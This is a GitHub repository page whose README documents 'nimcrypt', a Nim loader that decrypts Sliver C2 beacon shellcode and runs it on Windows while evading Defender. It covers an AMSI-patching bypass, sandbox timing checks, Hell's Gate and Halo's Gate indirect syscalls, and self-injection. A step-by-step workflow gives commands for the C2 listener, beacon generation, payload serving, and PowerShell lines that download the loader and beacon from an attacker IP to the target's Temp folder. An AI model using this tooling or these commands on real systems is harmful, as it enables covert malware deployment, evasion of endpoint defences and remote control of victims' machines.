# https://github.com/Chaelsoo/nimcrypt

[Skip to content](https://github.com/Chaelsoo/nimcrypt#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/Chaelsoo/nimcrypt) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/Chaelsoo/nimcrypt) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/Chaelsoo/nimcrypt) to refresh your session.Dismiss alert

{{ message }}

[Chaelsoo](https://github.com/Chaelsoo)/ **[nimcrypt](https://github.com/Chaelsoo/nimcrypt)** Public

- [Notifications](https://github.com/login?return_to=%2FChaelsoo%2Fnimcrypt) You must be signed in to change notification settings
- [Fork\\
4](https://github.com/login?return_to=%2FChaelsoo%2Fnimcrypt)
- [Star\\
26](https://github.com/login?return_to=%2FChaelsoo%2Fnimcrypt)


master

[**1** Branch](https://github.com/Chaelsoo/nimcrypt/branches) [**0** Tags](https://github.com/Chaelsoo/nimcrypt/tags)

[Go to Branches page](https://github.com/Chaelsoo/nimcrypt/branches)[Go to Tags page](https://github.com/Chaelsoo/nimcrypt/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![Chaelsoo](https://avatars.githubusercontent.com/u/67665164?v=4&size=40)](https://github.com/Chaelsoo)[Chaelsoo](https://github.com/Chaelsoo/nimcrypt/commits?author=Chaelsoo)<br>[Add blog ref](https://github.com/Chaelsoo/nimcrypt/commit/ea573705aea71724ccf639094a4b078c9e2f11e1)<br>last monthJul 13, 2026<br>[ea57370](https://github.com/Chaelsoo/nimcrypt/commit/ea573705aea71724ccf639094a4b078c9e2f11e1) · last monthJul 13, 2026<br>## History<br>[6 Commits](https://github.com/Chaelsoo/nimcrypt/commits/master/) <br>Open commit details<br>[View commit history for this file.](https://github.com/Chaelsoo/nimcrypt/commits/master/) 6 Commits |
| [stageless](https://github.com/Chaelsoo/nimcrypt/tree/master/stageless "stageless") | [stageless](https://github.com/Chaelsoo/nimcrypt/tree/master/stageless "stageless") | [Edit Outbound connection](https://github.com/Chaelsoo/nimcrypt/commit/ac32747140fd6f225ee77bf2484b87fc861d078d "Edit Outbound connection") | last monthJul 9, 2026 |
| [stager](https://github.com/Chaelsoo/nimcrypt/tree/master/stager "stager") | [stager](https://github.com/Chaelsoo/nimcrypt/tree/master/stager "stager") | [Add Stageless Loader](https://github.com/Chaelsoo/nimcrypt/commit/1eb5793a2a8728616fe95d3c355bc35637037f46 "Add Stageless Loader") | last monthJul 9, 2026 |
| [.gitignore](https://github.com/Chaelsoo/nimcrypt/blob/master/.gitignore ".gitignore") | [.gitignore](https://github.com/Chaelsoo/nimcrypt/blob/master/.gitignore ".gitignore") | [Init](https://github.com/Chaelsoo/nimcrypt/commit/86ed86383f24657fccbabefd73bada3ba338046b "Init") | 2 months agoJun 29, 2026 |
| [LICENSE](https://github.com/Chaelsoo/nimcrypt/blob/master/LICENSE "LICENSE") | [LICENSE](https://github.com/Chaelsoo/nimcrypt/blob/master/LICENSE "LICENSE") | [Add License](https://github.com/Chaelsoo/nimcrypt/commit/464b52f0c487570d52a05b9144121dc7ed3b0eae "Add License") | last monthJul 9, 2026 |
| [README.md](https://github.com/Chaelsoo/nimcrypt/blob/master/README.md "README.md") | [README.md](https://github.com/Chaelsoo/nimcrypt/blob/master/README.md "README.md") | [Add blog ref](https://github.com/Chaelsoo/nimcrypt/commit/ea573705aea71724ccf639094a4b078c9e2f11e1 "Add blog ref") | last monthJul 13, 2026 |
| [amsi.nim](https://github.com/Chaelsoo/nimcrypt/blob/master/amsi.nim "amsi.nim") | [amsi.nim](https://github.com/Chaelsoo/nimcrypt/blob/master/amsi.nim "amsi.nim") | [Init](https://github.com/Chaelsoo/nimcrypt/commit/86ed86383f24657fccbabefd73bada3ba338046b "Init") | 2 months agoJun 29, 2026 |
| [encrypt.py](https://github.com/Chaelsoo/nimcrypt/blob/master/encrypt.py "encrypt.py") | [encrypt.py](https://github.com/Chaelsoo/nimcrypt/blob/master/encrypt.py "encrypt.py") | [Init](https://github.com/Chaelsoo/nimcrypt/commit/86ed86383f24657fccbabefd73bada3ba338046b "Init") | 2 months agoJun 29, 2026 |
| [gen\_amsi.py](https://github.com/Chaelsoo/nimcrypt/blob/master/gen_amsi.py "gen_amsi.py") | [gen\_amsi.py](https://github.com/Chaelsoo/nimcrypt/blob/master/gen_amsi.py "gen_amsi.py") | [Init](https://github.com/Chaelsoo/nimcrypt/commit/86ed86383f24657fccbabefd73bada3ba338046b "Init") | 2 months agoJun 29, 2026 |
| [nim.cfg](https://github.com/Chaelsoo/nimcrypt/blob/master/nim.cfg "nim.cfg") | [nim.cfg](https://github.com/Chaelsoo/nimcrypt/blob/master/nim.cfg "nim.cfg") | [Add Stageless Loader](https://github.com/Chaelsoo/nimcrypt/commit/1eb5793a2a8728616fe95d3c355bc35637037f46 "Add Stageless Loader") | last monthJul 9, 2026 |
| View all files |

## Repository files navigation

# nimcrypt

[Permalink: nimcrypt](https://github.com/Chaelsoo/nimcrypt#nimcrypt)

A Sliver shellcode loader written in Nim targeting Windows x64. Two variants covering the two most common delivery situations. Tested against Windows Defender with real-time protection enabled.

## Variants

[Permalink: Variants](https://github.com/Chaelsoo/nimcrypt#variants)

### stager

[Permalink: stager](https://github.com/Chaelsoo/nimcrypt#stager)

Reads an encrypted shellcode blob from disk, decrypts it in memory, and self-injects. Use this when you already have a file drop primitive and want a small, simple binary.

```
loader.exe <shellcode.bin> [key_hex iv_hex]
```

Key and IV are optional. If omitted, the file is treated as raw unencrypted shellcode.

### stageless

[Permalink: stageless](https://github.com/Chaelsoo/nimcrypt#stageless)

Downloads the encrypted blob from your C2 over HTTP using the Windows WinHTTP stack, decrypts it in memory, and self-injects. No file ever touches disk. Use this when you can execute a binary on the target but cannot reliably drop a second file.

Edit the constants at the top of `stageless/loader.nim` before compiling:

```
c2Host = "C2_HOST"
c2Port = 443'u16
c2Path = "/payload.bin"
scKey  = "..."   # 64 hex chars from encrypt.py
scIV   = "..."   # 32 hex chars from encrypt.py
```

## Techniques

[Permalink: Techniques](https://github.com/Chaelsoo/nimcrypt#techniques)

### Sandbox evasion

[Permalink: Sandbox evasion](https://github.com/Chaelsoo/nimcrypt#sandbox-evasion)

The stageless loader calls `Sleep(5000)` on startup and measures actual elapsed time with `GetTickCount64`. If less than 4500ms passed, the process exits. Most automated sandbox environments fast-forward or skip sleeps, causing the check to fail. This runs before any network activity or shellcode execution so sandboxes that inspect network behaviour see nothing.

### AMSI bypass

[Permalink: AMSI bypass](https://github.com/Chaelsoo/nimcrypt#amsi-bypass)

`amsi.nim` patches `AmsiScanBuffer` at runtime using two layers of obfuscation:

**String hiding via FNV-1a hashing.** The string `AmsiScanBuffer` never appears in the binary. Instead, its FNV-1a hash is computed at compile time and stored as a constant. At runtime the loader walks amsi.dll's export table, hashes each export name, and compares against the stored value to find the function address without ever holding the string in memory.

**Compile-time XOR obfuscation.** Both the DLL name (`amsi.dll`) and the patch bytes (`xor eax, eax; ret` = `31 C0 C3`) are XOR-encoded at compile time using a random key generated fresh each build via a Python subprocess. The key is embedded as a constant and the bytes are decoded at runtime immediately before use. The raw bytes change every build, breaking static signatures on the patch sequence.

The patch overwrites the first three bytes of `AmsiScanBuffer` with `xor eax, eax; ret`, making every call return `AMSI_RESULT_CLEAN` regardless of input.

### Payload encryption

[Permalink: Payload encryption](https://github.com/Chaelsoo/nimcrypt#payload-encryption)

`encrypt.py` encrypts raw shellcode with AES-256-CBC using a randomly generated 32-byte key and 16-byte IV. The loader decrypts in-place using the Windows BCrypt API, so no third-party crypto library is needed on the target.

### RW to RX memory transition

[Permalink: RW to RX memory transition](https://github.com/Chaelsoo/nimcrypt#rw-to-rx-memory-transition)

Memory is allocated as `PAGE_READWRITE`, the shellcode is written into it, and then the region is flipped to `PAGE_EXECUTE_READ` before execution. Allocating directly as `PAGE_EXECUTE_READWRITE` is a well-known signature that Defender and EDRs flag explicitly. Separating the write and execute phases avoids that pattern.

### Indirect syscalls (Hell's Gate + Halo's Gate)

[Permalink: Indirect syscalls (Hell's Gate + Halo's Gate)](https://github.com/Chaelsoo/nimcrypt#indirect-syscalls-hells-gate--halos-gate)

`stageless/syscalls.nim` bypasses both the Win32 API layer (kernel32.dll) and any ntdll.dll userland hooks placed by EDRs.

**SSN resolution.** At startup the loader gets ntdll's base address and parses its PE export table, collecting every `Nt*` export sorted by RVA. For each NT function we need, it checks the first four bytes:

- `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`) means the stub is clean and the SSN is read directly from bytes 4-5. This is Hell's Gate.
- Anything else means the function prologue has been patched by an EDR hook. In that case the loader walks neighbors in the sorted list until it finds a clean stub, then computes the target SSN as `neighbor_SSN +/- distance`. SSNs increment by one per stub in address order. This is Halo's Gate.

**Gadget location.** The loader scans the first clean Nt\* stub it finds for the byte sequence `0F 05 C3` (`syscall; ret`). This gives an address inside ntdll's image-backed `.text` section that we can reuse.

**Stub generation.** For each required function a 22-byte stub is written into a single RW page that is flipped to RX before use:

```
4C 8B D1              mov r10, rcx
B8 xx xx 00 00        mov eax, <SSN>
FF 25 00 00 00 00     jmp qword ptr [rip+0]
xx xx xx xx xx xx xx xx  gadget address
```

The `jmp [rip+0]` dereferences the 8 bytes immediately following it (the gadget address) and redirects execution into ntdll's existing `syscall; ret` sequence. The `syscall` instruction fires from ntdll's `.text` rather than from our anonymous allocation, defeating any kernel-level tracking of which memory region issued the syscall.

The four functions covered by indirect syscalls are `NtAllocateVirtualMemory`, `NtProtectVirtualMemory`, `NtCreateThreadEx`, and `NtWaitForSingleObject`.

### Self-injection

[Permalink: Self-injection](https://github.com/Chaelsoo/nimcrypt#self-injection)

After decryption, the stageless loader allocates a RW region in its own process via `NtAllocateVirtualMemory`, copies the shellcode in with `copyMem`, flips the region to RX via `NtProtectVirtualMemory`, and spawns a thread via `NtCreateThreadEx`. The main thread then blocks indefinitely on `NtWaitForSingleObject`, keeping the process alive while the beacon's goroutines run. All four calls go through the indirect syscall stubs described above.

Self-injection keeps the call surface minimal. There are no cross-process API calls (`WriteProcessMemory`, `CreateRemoteThread`, etc.), which are the primary detection vectors for classic remote injection.

## Execution flow (stageless)

[Permalink: Execution flow (stageless)](https://github.com/Chaelsoo/nimcrypt#execution-flow-stageless)

01. Timing check: sleep 5s, exit if elapsed < 4.5s
02. AMSI patch: resolve `AmsiScanBuffer` via FNV-1a, overwrite with `xor eax, eax; ret`
03. Resolve indirect syscall stubs: parse ntdll exports, find SSNs (Hell's Gate + Halo's Gate), locate `syscall; ret` gadget, write stubs
04. Download: WinHTTP GET request, read response body
05. Decrypt: AES-256-CBC via BCrypt in place
06. Allocate: `NtAllocateVirtualMemory` in own process (RW) via indirect syscall
07. Copy shellcode into the allocation
08. Protect: `NtProtectVirtualMemory` to PAGE\_EXECUTE\_READ via indirect syscall
09. Execute: `NtCreateThreadEx` via indirect syscall
10. Wait: `NtWaitForSingleObject` on the thread handle via indirect syscall

## Execution flow (stager)

[Permalink: Execution flow (stager)](https://github.com/Chaelsoo/nimcrypt#execution-flow-stager)

1. AMSI patch
2. Read shellcode file from disk
3. Decrypt if key and IV were provided
4. `VirtualAlloc` (RW), copy shellcode, `VirtualProtect` to RX
5. Execute via function pointer cast

## Requirements

[Permalink: Requirements](https://github.com/Chaelsoo/nimcrypt#requirements)

On your Linux build machine:

- Nim + nimble (`nimble install winim`)
- mingw-w64 (`x86_64-w64-mingw32-gcc`)
- Python 3 + pycryptodome (`pip install pycryptodome`)

## Full workflow

[Permalink: Full workflow](https://github.com/Chaelsoo/nimcrypt#full-workflow)

### 1\. Start a Sliver listener

[Permalink: 1. Start a Sliver listener](https://github.com/Chaelsoo/nimcrypt#1-start-a-sliver-listener)

```
[server] sliver > mtls --lhost 10.10.14.42 --lport 443
```

### 2\. Generate beacon shellcode

[Permalink: 2. Generate beacon shellcode](https://github.com/Chaelsoo/nimcrypt#2-generate-beacon-shellcode)

```
[server] sliver > generate beacon --mtls 10.10.14.42:443 --os windows --arch amd64 --format shellcode --skip-symbols beacon
```

### 3\. Encrypt

[Permalink: 3. Encrypt](https://github.com/Chaelsoo/nimcrypt#3-encrypt)

```
python3 encrypt.py beacon.bin
# key: 16cd37303052eb9068cf18eee3fd36c2f448afc2778bbd5aa6b2eaf416191997
# iv:  83b82994e8c512d536f7d42e89d6e761
```

### 4\. Set constants and compile

[Permalink: 4. Set constants and compile](https://github.com/Chaelsoo/nimcrypt#4-set-constants-and-compile)

Edit `stageless/loader.nim` and set `c2Host`, `c2Port`, `c2Path`, `scKey`, `scIV`, then from the project root:

```
# stageless
nim c -d:release -o:bins/loader.exe stageless/loader.nim

# stager
nim c -d:release -o:bins/loader.exe stager/loader.nim
```

Always compile from the project root so that only the root `nim.cfg` is loaded. The output is a statically linked Windows x64 PE with no external DLL dependencies beyond standard system libraries.

### 5\. Serve or transfer

[Permalink: 5. Serve or transfer](https://github.com/Chaelsoo/nimcrypt#5-serve-or-transfer)

Stageless: serve the encrypted blob over HTTP on the port matching `c2Port`:

```
cd bins && python3 -m http.server 443
```

Stager: transfer both files to the target:

```
(New-Object Net.WebClient).DownloadFile("http://10.10.14.42/loader.exe", "C:\Windows\Temp\loader.exe")
(New-Object Net.WebClient).DownloadFile("http://10.10.14.42/beacon_enc.bin", "C:\Windows\Temp\beacon.bin")
```

### 6\. Execute

[Permalink: 6. Execute](https://github.com/Chaelsoo/nimcrypt#6-execute)

Stageless:

```
loader.exe
```

Stager with encryption:

```
loader.exe beacon.bin 16cd37303052eb9068cf18eee3fd36c2f448afc2778bbd5aa6b2eaf416191997 83b82994e8c512d536f7d42e89d6e761
```

Stager without encryption:

```
loader.exe shellcode.bin
```

## PowerShell delivery

[Permalink: PowerShell delivery](https://github.com/Chaelsoo/nimcrypt#powershell-delivery)

If delivering via a PowerShell download cradle, AMSI will scan the script before the loader runs. Patch AMSI in your PS session first:

```
python3 gen_amsi.py
```

Paste the output into the PS session before downloading or executing anything. The script resolves `AmsiScanBuffer` by export table hash so the string never appears in plaintext, and all patch bytes are XOR-encoded with a random per-run key.

## Notes

[Permalink: Notes](https://github.com/Chaelsoo/nimcrypt#notes)

- Requires Windows 10 / Server 2016+ (Universal CRT)
- `BCryptSetProperty` for chaining mode returns `STATUS_INVALID_PARAMETER` but BCrypt defaults to CBC regardless, decryption works correctly
- Indirect syscalls cover only the four injection-critical NT functions. Winsock and BCrypt calls still go through their normal API paths, which is acceptable since those calls are behaviorally benign in isolation
- The `syscall` instruction in the stubs fires from inside ntdll's `.text` section (image-backed, Microsoft-signed), not from the stub page, defeating kernel-level syscall origin tracking

## References

[Permalink: References](https://github.com/Chaelsoo/nimcrypt#references)

- [https://github.com/gatariee/ldrgen](https://github.com/gatariee/ldrgen)
- [https://github.com/D3Ext/Hooka](https://github.com/D3Ext/Hooka)

You can find more details about Defender Mechanisms, Techniques & Other tools on [my blog](https://chaelsoo.me/)

## About

Nim-based encryption tool for obfuscating shellcode and payloads for evading Windows Defender.

### Resources

[Readme](https://github.com/Chaelsoo/nimcrypt#readme-ov-file)

[MIT license](https://github.com/Chaelsoo/nimcrypt#MIT-1-ov-file)

[Activity](https://github.com/Chaelsoo/nimcrypt/activity)

### Stars

**26** stars

### Watchers

**0** watching

### Forks

[**4** forks](https://github.com/Chaelsoo/nimcrypt/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FChaelsoo%2Fnimcrypt&report=Chaelsoo+%28user%29)

## Releases

## Packages

## Contributors

## Languages

You can’t perform that action at this time.